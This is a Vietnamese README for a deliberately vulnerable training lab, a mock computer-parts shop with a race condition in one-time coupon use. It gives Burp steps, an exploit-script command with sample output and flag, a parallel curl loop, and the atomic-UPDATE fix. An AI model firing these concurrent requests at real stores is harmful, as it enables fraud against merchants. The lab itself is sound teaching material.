# PixelMart Lab — Race Condition (TOCTOU) khi áp mã giảm giá

Lab web giả lập một cửa hàng bán linh kiện máy tính (PixelMart), chỉ chứa
**một lỗ hổng duy nhất**: Race Condition dạng *Time-of-Check to Time-of-Use*
(TOCTOU) ở chức năng áp mã giảm giá trong giỏ hàng — CWE-367.

Đây là lỗi **business logic**: mọi request gửi lên đều hợp lệ về cú pháp,
đúng định dạng, đúng xác thực. Scanner (ZAP, Nuclei, Nikto…) sẽ không
tìm ra lỗi này vì nó không nằm ở input độc hại mà nằm ở **thứ tự thời
gian xử lý** giữa nhiều request chạy song song.

---

## 1. Mô hình ứng dụng

PixelMart là một website bán linh kiện máy tính đầy đủ chức năng:

| Trang | Mô tả |
|---|---|
| `/` | Trang chủ: lưới sản phẩm, tìm kiếm theo tên, lọc theo danh mục |
| `/product/<id>` | Chi tiết sản phẩm: mô tả, sản phẩm liên quan, đánh giá (viết/xem) |
| `/register`, `/login` | Đăng ký tài khoản mới, đăng nhập |
| `/cart` | Giỏ hàng: xem/xoá sản phẩm, áp mã giảm giá, thanh toán |
| `/profile` | Xem/sửa thông tin cá nhân (họ tên, email, địa chỉ), đổi mật khẩu |
| `/orders`, `/orders/<id>` | Lịch sử đơn hàng (có trạng thái đơn mô phỏng) và chi tiết từng đơn (chỉ xem được đơn của chính mình) |
| `/about`, `/policy`, `/contact` | Trang giới thiệu, chính sách đổi trả/bảo hành, liên hệ (chỉ là nội dung tĩnh để tăng độ thật) |

Luồng mua hàng: đăng ký/đăng nhập → duyệt/tìm sản phẩm (có lọc trang,
tìm kiếm, bộ lọc danh mục) → thêm vào giỏ → chọn phương thức thanh toán
(COD / chuyển khoản) → áp mã giảm giá `SALE20` (giảm 20%, **chỉ được áp
dụng 1 lần** cho mỗi giỏ hàng) → thanh toán (có tính phí vận chuyển,
miễn phí nếu đơn ≥ 300.000đ) → xem lại trong lịch sử đơn hàng (trạng
thái đơn thay đổi theo thời gian: Đang xác nhận → Đang đóng gói → Đang
giao hàng → Đã giao thành công).

- Backend: Python Flask + SQLite, chạy trong container Docker, tự reset
  dữ liệu mỗi lần container khởi động.
- Mật khẩu được hash (werkzeug), có 10 sản phẩm mẫu thuộc 7 danh mục.
- Tài khoản demo: `tester` / `Password123!` (bạn cũng có thể tự đăng ký
  tài khoản mới qua `/register`).
- Giao diện có banner khuyến mãi tự động chạy, khung xương (skeleton)
  khi tải giỏ hàng, huy hiệu niềm tin (miễn phí ship/bảo hành/đổi trả),
  số lượng đã bán trên mỗi sản phẩm, avatar màu cho người đánh giá,
  trang 404/500 tuỳ biến, SEO meta tag cơ bản, favicon, và bố cục tự co
  giãn trên di động (responsive).
- Giao diện sáng (light theme), tông xanh dương chủ đạo, dạng sàn TMĐT
  thật (topbar khuyến mãi, navbar có ô tìm kiếm + icon giỏ hàng, subnav
  danh mục, thẻ sản phẩm nền trắng bo góc đổ bóng, giá gạch ngang so
  sánh, phân trang kiểu nút tròn, footer nhiều cột) — lấy cảm hứng
  layout/màu từ một frontend TMĐT tham khảo, viết lại hoàn toàn bằng
  CSS thuần (`static/style.css`), không dùng framework/build step. Mọi
  route, tên trường form, id phần tử dùng trong JS (giỏ hàng, checkout)
  đều giữ nguyên — chỉ thay đổi giao diện, không đổi logic.
- Mỗi sản phẩm có 3 ảnh minh hoạ phong cách studio (`static/products/
  p<id>_1.jpg`, `_2.jpg`, `_3.jpg`) được vẽ hoàn toàn offline bằng
  Pillow (minh hoạ vector đơn giản theo từng loại sản phẩm, không tải
  ảnh/logo thật từ Internet) nên không có rủi ro bản quyền/thương hiệu
  và không cần mạng khi chạy trong Docker. Trang chủ/sản phẩm liên
  quan/giỏ hàng dùng ảnh đầu tiên làm ảnh đại diện; trang chi tiết sản
  phẩm có gallery 3 ảnh bấm để đổi ảnh chính.

  **Muốn dùng ảnh chụp thật thay vì ảnh vector?** Môi trường build/chạy
  sandbox dùng để phát triển lab này có tường lửa chỉ cho phép ra
  Internet tới các kho gói (pip/npm) và GitHub, nên không thể tự tải
  ảnh từ các kho ảnh stock (Unsplash/Pexels/Openverse...) ngay trong đó.
  Thay vào đó, repo có sẵn script tuỳ chọn `scripts/fetch_real_product_images.py`
  — chạy **một lần, thủ công, trên máy có Internet thật** (máy Windows
  của bạn, hoặc VM Debian nếu nó có mạng ra ngoài):

  ```bash
  pip install --break-system-packages requests pillow
  python3 scripts/fetch_real_product_images.py
  ```

  Script tự tìm và tải ảnh thật qua Openverse API (kho tổng hợp ảnh có
  giấy phép mở, miễn phí, không cần API key), chỉ lấy ảnh được phép
  dùng thương mại, resize/crop về đúng kích thước rồi **ghi đè** vào
  đúng `static/products/p<id>_1/2/3.jpg` — không cần sửa gì ở
  template/app.py. Nguồn/giấy phép từng ảnh được ghi lại vào
  `static/products/SOURCES.md` để tra cứu. Chạy xong thì build lại
  (`docker compose up --build -d`) là ảnh mới lên ngay. Nếu không chạy
  script này, lab vẫn hoạt động bình thường với ảnh vector có sẵn.
- Nút **Thanh toán** mô phỏng luồng checkout thật: hiện popup loading
  (~1.2-1.7s) rồi mới mở popup "Đặt hàng thành công" (có mã đơn, số
  tiền, email xác nhận, và flag nếu khai thác thành công) thay vì trả
  kết quả tức thì ra dòng chữ trên trang. Đây **chỉ là độ trễ hiển thị
  phía client** (JS `setTimeout`) — request thật tới `/api/cart/checkout`
  vẫn được gửi và xử lý ngay lập tức, không có gì thay đổi ở backend.
  Mục đích là để giao diện không "lộ" kết quả bất thường một cách lộ
  liễu khi bấm nút thủ công, buộc người kiểm thử phải bắt/gửi lại
  request bằng Burp Repeater hoặc script (như `exploit/race_coupon.py`)
  thay vì chỉ click nút nhanh tay trên UI mới phát hiện và khai thác
  được race condition.

> **Lưu ý về phạm vi lỗ hổng:** toàn bộ các chức năng mới (đăng ký, trang
> cá nhân, lịch sử đơn hàng, đánh giá sản phẩm...) đều được viết an toàn
> có chủ đích — có kiểm tra quyền sở hữu (vd. `/orders/<id>` chỉ cho xem
> đơn hàng của chính người đăng nhập, trả về 404 nếu cố xem đơn của
> người khác), dùng parameterized query, không có `|safe` trong
> template. **Lỗ hổng duy nhất của lab vẫn là race condition ở
> `/api/cart/apply-coupon`** như mô tả bên dưới — các chức năng khác chỉ
> để làm bối cảnh giống một cửa hàng thật, không phải để tìm thêm lỗi.

## 2. Lỗ hổng nằm ở đâu

File `app.py`, route `/api/cart/apply-coupon`. Luồng xử lý:

```
1. TIME OF CHECK : SELECT coupon_applied FROM carts WHERE id = ?
2. (giả lập xử lý nghiệp vụ tốn thời gian — sleep 0.35s)
3. TIME OF USE   : UPDATE carts SET coupon_applied = 1, coupon_uses += 1
```

Bước kiểm tra (1) và bước ghi nhận (3) **không nằm trong một thao tác
nguyên tử (atomic)**. Giữa hai bước có một khoảng trễ (race window).
Nếu nhiều request `apply-coupon` được gửi gần như đồng thời, tất cả đều
đọc `coupon_applied = 0` ở bước (1) **trước khi** bất kỳ request nào
kịp ghi `coupon_applied = 1` ở bước (3) — nên tất cả đều vượt qua điều
kiện kiểm tra và cộng dồn giảm giá 20% nhiều lần.

Hệ quả: giỏ hàng trị giá hàng triệu đồng có thể giảm về gần 0đ.

> Lưu ý sư phạm: độ trễ `time.sleep(0.35)` được thêm vào có chủ đích để
> race window đủ rộng, dễ khai thác bằng tay hoặc bằng script đơn giản.
> Trong thực tế race window thường hẹp hơn nhiều (vài mili-giây do độ
> trễ I/O của database thật), nhưng bản chất lỗi và cách khai thác
> (bắn nhiều request song song) là giống hệt.

---

## 3. Triển khai bằng Docker trên Debian

### 3.1. Cài Docker (nếu máy Debian chưa có)

```bash
sudo apt update && sudo apt install -y docker.io docker-compose-plugin
sudo systemctl enable --now docker
sudo usermod -aG docker $USER   # rồi đăng xuất/đăng nhập lại để khỏi cần sudo
```

### 3.2. Build và chạy lab

```bash
git clone https://github.com/tuanhungh81sc/pixelmart.git
cd pixelmart
docker compose up --build -d
```

Kiểm tra container đang chạy:

```bash
docker compose ps
docker compose logs -f
```

Mở trình duyệt tới `http://localhost:5000`, đăng nhập bằng
`tester` / `Password123!`.

### 3.3. Dừng / reset lab

```bash
docker compose down        # dừng
docker compose up --build -d   # chạy lại, dữ liệu tự reset sạch
```

---

## 4. Hướng dẫn kiểm thử thủ công (Burp Suite / trình duyệt)

### Bước 1 — Xác nhận hành vi "bình thường" (chặn áp mã 2 lần)

1. Đăng nhập, thêm 1 sản phẩm bất kỳ vào giỏ.
2. Mở trang giỏ hàng `/cart`, bấm nút **🎟️ Chọn mã giảm giá** để mở danh
   sách voucher, bấm **Dùng mã** ở dòng `SALE20` → thấy giảm 20%.
   (Hai mã `FREESHIP50` và `WELCOME10` chỉ hiển thị trang trí, không
   hoạt động — không phải mục tiêu khai thác của lab này.)
3. Mở lại danh sách, bấm **Dùng mã** ở `SALE20` lần nữa → ứng dụng báo
   lỗi `coupon already applied`.

→ Điều này cho thấy có một cơ chế kiểm tra "đã dùng chưa", và nó **hoạt
động đúng khi gửi tuần tự**. Đây chính là điểm khiến scanner tự động bỏ
qua: test tuần tự không phát hiện ra vấn đề gì.

### Bước 2 — Soi request bằng Burp Suite

1. Bật Burp, trỏ proxy trình duyệt qua Burp (`127.0.0.1:8080`).
2. Thêm sản phẩm vào giỏ, mở **Proxy → HTTP history**, tìm request:

   ```
   POST /api/cart/apply-coupon HTTP/1.1
   Host: localhost:5000
   Cookie: session=...
   Content-Type: application/json

   {"code":"SALE20"}
   ```
3. Click phải → **Send to Repeater**.
4. Trong Repeater, gửi request này 2 lần liên tiếp bằng tay → lần 2 báo
   lỗi `coupon already applied` (xác nhận lại bước 1).

### Bước 3 — Khai thác race condition bằng Burp Repeater (nhóm song song)

Burp Suite 2023.9 trở lên hỗ trợ gửi nhiều request trong Repeater **cùng
lúc** qua kỹ thuật *single-packet attack* (giảm jitter mạng xuống gần 0):

1. Trong tab Repeater đang có request `apply-coupon`, nhấn **Ctrl** (hoặc
   **Cmd** trên Mac) và click để chọn thêm nhiều tab Repeater khác đang
   chứa cùng request đó (hoặc duplicate tab request đó ra 15–20 tab).
2. Click phải vào nhóm tab đã chọn → **Send group in parallel**
   (hoặc **Send group in sequence (single connection)** tùy phiên bản).
3. Chọn chế độ gửi song song nhất có thể.
4. Sau khi gửi, kiểm tra từng response trong nhóm: nếu nhiều hơn 1
   response trả về `"ok": true` (thay vì chỉ 1 cái `ok` và phần còn lại
   `coupon already applied`) → **đã khai thác thành công race
   condition**.
5. Quay lại trình duyệt, refresh giỏ hàng → thấy `coupon_uses` > 1,
   `final_price` giảm sâu bất thường (có thể về 0đ).
6. Bấm **Thanh toán** → nếu áp mã ≥ 3 lần và giá cuối ≤ 10% giá gốc,
   ứng dụng trả về `flag` trong JSON response của `/api/cart/checkout`.

> Nếu chưa có Burp Suite Pro (tính năng gửi song song chỉ có ở bản trả
> phí hoặc extension Turbo Intruder), dùng script ở Bước 4 — hiệu quả
> tương đương và miễn phí.

### Bước 4 — Khai thác bằng script có sẵn trong lab

Lab đi kèm sẵn script khai thác tại `exploit/race_coupon.py`.

```bash
pip install --break-system-packages requests
python3 exploit/race_coupon.py --url http://localhost:5000 \
    --user tester --password 'Password123!' --threads 20
```

Script sẽ tự động:
1. Đăng nhập, lấy cookie session.
2. Thêm 1 sản phẩm vào giỏ.
3. Dùng `threading` để bắn 20 request `apply-coupon` gần như đồng thời
   vào đúng race window (0.35s).
4. In ra số request thành công, trạng thái giỏ hàng, rồi tự gọi
   checkout để lấy giá cuối cùng và flag.

**Kết quả thực tế khi test lab này** (threads=15):

```
[+] So request ap ma THANH CONG: 15 / 15

[+] Gio hang sau tan cong:
      coupon_uses  = 15   (ky vong neu AN TOAN: toi da 1)
      subtotal     = 1,200,000d
      discount     = 3,600,000d
      final_price  = 0d

[!!!] KHAI THAC THANH CONG: ma giam gia 'chi dung 1 lan' da bi cong don
      15 lan do race condition (TOCTOU)!

[+] Ket qua checkout: {'coupon_uses': 15, 'discount': 3600000,
    'final_price': 0, 'flag': 'LAB{race_cond1tion_t0ctou_coupon_stack_pixelmart}',
    'ok': True, 'subtotal': 1200000}
```

Toàn bộ giỏ hàng trị giá 1.200.000đ được mua với giá **0đ**.

### Bước 5 (tuỳ chọn) — Khai thác thủ công bằng `curl` song song

Nếu muốn tự tay làm mà không cần Python, có thể dùng vòng lặp `curl`
chạy nền (độ chính xác thời gian kém hơn threading, nhưng vẫn có thể
khai thác được nhờ race window rộng 0.35s):

```bash
# Đăng nhập trước, lưu cookie
curl -s -c cookies.txt -X POST http://localhost:5000/login \
  -d "username=tester&password=Password123!" -o /dev/null

# Thêm sản phẩm
curl -s -b cookies.txt -X POST http://localhost:5000/api/cart/add \
  -H "Content-Type: application/json" -d '{"product_id":1,"quantity":1}'

# Bắn 15 request áp mã song song
for i in $(seq 1 15); do
  curl -s -b cookies.txt -X POST http://localhost:5000/api/cart/apply-coupon \
    -H "Content-Type: application/json" -d '{"code":"SALE20"}' &
done
wait

# Kiểm tra giỏ hàng
curl -s -b cookies.txt http://localhost:5000/api/cart
```

---

## 5. Vì sao scanner tự động không phát hiện được

- Mỗi request riêng lẻ đều là request hợp lệ: đúng xác thực (có
  session cookie), đúng định dạng JSON, đúng mã giảm giá thật.
- Không có payload độc hại (không SQLi, không XSS, không path
  traversal) để scanner dựa vào signature.
- Lỗi chỉ xuất hiện khi **nhiều request được gửi đúng thời điểm** —
  đây là hành vi mà scanner DAST thông thường (chạy tuần tự, mỗi lần
  một request) không mô phỏng.
- Cần tư duy nghiệp vụ: hiểu "coupon chỉ dùng 1 lần" là một ràng buộc
  logic, rồi tự đặt câu hỏi "ràng buộc này được thực thi nguyên tử hay
  không?" — đây là bước chỉ con người (hoặc công cụ chuyên biệt như
  Burp Turbo Intruder) mới làm được.

## 6. Hướng khắc phục (remediation) — để hiểu bản chất lỗi

Lỗi gốc là thiếu tính nguyên tử. Cách sửa đúng là gộp bước kiểm tra và
ghi nhận vào **một UPDATE có điều kiện**, dựa vào `rowcount` để biết có
thực sự là request đầu tiên hay không:

```python
# Sửa đúng: UPDATE có điều kiện, kiểm tra rowcount thay vì SELECT rồi UPDATE riêng
cursor = db.execute(
    "UPDATE carts SET coupon_applied = 1, coupon_uses = coupon_uses + 1 "
    "WHERE id = ? AND coupon_applied = 0",
    (cart_id,),
)
db.commit()
if cursor.rowcount == 0:
    return jsonify({"error": "coupon already applied"}), 409
```

Cách này đảm bảo chỉ **đúng một** request trong số các request chạy
song song có thể làm thay đổi `coupon_applied` từ 0 → 1, vì SQLite
(và hầu hết RDBMS) tự khóa dòng dữ liệu trong một câu UPDATE đơn lẻ.

---

## 7. Cấu trúc thư mục

```
pixelmart/
├── app.py                   # Flask app (chứa lỗ hổng + comment giải thích)
├── requirements.txt
├── Dockerfile
├── docker-compose.yml
├── entrypoint.sh             # reset DB mỗi lần container start
├── templates/
│   ├── base.html             # layout chung (header, nav, flash message)
│   ├── login.html
│   ├── register.html
│   ├── home.html              # trang chủ: lưới sản phẩm + tìm kiếm/lọc
│   ├── product_detail.html    # chi tiết sản phẩm + đánh giá
│   ├── cart.html               # giỏ hàng + áp mã + thanh toán
│   ├── profile.html            # thông tin cá nhân + đổi mật khẩu
│   ├── orders.html             # danh sách đơn hàng (có trạng thái)
│   ├── order_detail.html       # chi tiết 1 đơn hàng (phí ship, thanh toán, trạng thái)
│   ├── about.html, policy.html, contact.html  # trang tĩnh (trust signal)
│   ├── 404.html
│   └── 500.html
├── static/
│   ├── style.css              # toàn bộ theme giao diện (thuần CSS)
│   └── products/               # ảnh sản phẩm sinh offline (p<id>_1/2/3.jpg)
└── exploit/
    └── race_coupon.py        # script khai thác tự động (không đổi,
                                 # vẫn gọi đúng các API endpoint cũ)
```

**Cảnh báo:** chỉ chạy lab này trong môi trường cô lập (máy cá nhân/VM
nội bộ), không expose cổng 5000 ra Internet.
